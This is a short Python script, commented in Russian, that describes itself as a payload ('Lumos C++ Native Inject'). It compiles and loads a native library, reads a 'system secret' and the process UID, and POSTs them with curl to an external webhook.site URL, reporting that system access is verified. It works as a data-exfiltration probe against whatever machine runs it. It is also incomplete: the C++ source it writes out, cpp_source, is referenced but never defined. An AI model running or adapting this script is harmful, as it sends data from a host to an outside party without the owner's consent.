import subprocess
import os
import ctypes

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def run_payload():
    # Шаг 1: Компиляция в Shared Library
    # -fPIC (Position Independent Code) обязателен для библиотек
    compile_cmd = ["g++", "-O3", "-fPIC", "-shared", "engine.cpp", "-o", "libengine.so"]
    subprocess.run(compile_cmd, check=True)
    
    # Шаг 2: Загрузка библиотеки через ctypes
    lib_path = os.path.abspath("libengine.so")
    lib = ctypes.CDLL(lib_path)
    
    # Указываем тип возвращаемого значения (char*)
    lib.get_system_secret.restype = ctypes.c_char_p
    
    # Шаг 3: Вызов C++ функции
    secret_data = lib.get_system_secret().decode('utf-8')
    
    # Шаг 4: Отчет
    report = (
        "--- [Lumos C++ Native Inject] ---\n"
        f"UID: {os.getuid()}\n"
        f"Kernel Info (via C++): {secret_data}\n"
        "Status: System access verified."
    )
    
    # Отправка
    subprocess.run(['curl', '-s', '-X', 'POST', '--data-urlencode', f"payload={report}", WEBHOOK_URL])
    print("[+] C++ payload executed and sent.")

if __name__ == "__main__":
    # Записываем файл engine.cpp перед запуском (если его нет)
    with open("engine.cpp", "w") as f:
        f.write(cpp_source) # cpp_source - это код выше
    run_payload()
